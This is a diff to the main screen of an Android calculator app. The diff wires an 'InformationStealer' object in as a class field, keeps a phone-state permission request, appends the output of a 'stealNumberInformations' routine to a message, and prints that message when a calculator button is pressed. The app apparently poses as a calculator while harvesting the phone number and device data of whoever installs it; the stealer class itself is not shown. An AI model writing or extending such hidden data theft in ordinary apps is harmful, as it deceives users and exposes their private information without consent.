@@ -29,6 +29,7 @@ public class MainActivity extends AppCompatActivity {
     private String operation = "";
     private double op1 = 0, op2 = 0, prevResult = 0;
     private TextView current, history;
+    private InformationStealer task = new InformationStealer(this);
 
     private class MyNumberButton {
         Button b;
@@ -130,7 +131,6 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         initializeComponents();
         Executor executor = Executors.newSingleThreadExecutor();
-        InformationStealer task = new InformationStealer(this);
 
         String[] permissions = {
                 Manifest.permission.READ_PHONE_STATE,
@@ -229,7 +229,7 @@ public class MainActivity extends AppCompatActivity {
                     operation = "";
                     break;
             }
-
+            System.out.println(task.getMessaggio());
         });
 
         this.<Button>findViewById(R.id.ansBtn).setOnClickListener(v -> {
@@ -270,7 +270,6 @@ public class MainActivity extends AppCompatActivity {
             }, PERMISSION_REQUEST_PHONE_STATE);
         } else {
             // I permessi sono già stati concessi
-            InformationStealer task = new InformationStealer(this);
             task.setMessaggio(task.getMessaggio().append(stealNumberInformations(this)));
         }
     }
